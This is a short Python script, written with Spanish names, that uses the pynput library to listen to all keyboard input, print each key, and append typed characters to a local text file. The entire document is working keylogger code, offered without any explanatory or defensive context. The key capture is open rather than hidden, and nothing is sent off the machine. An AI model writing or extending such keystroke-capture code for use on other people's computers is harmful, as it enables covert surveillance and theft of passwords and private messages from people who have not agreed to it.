from pynput import keyboard

def tecla_pulsada(tecla):
    print(str(f"\nTecla presionada: ${tecla}"))
    with open("archivo.txt",'a') as lectura_tecla:
        try:
            char = tecla.char
            lectura_tecla.write(char)
        except:
            print("error al obtener un char")


if __name__ == "__main__":
    escucha =  keyboard.Listener(on_press=tecla_pulsada)
    escucha.start()
    input()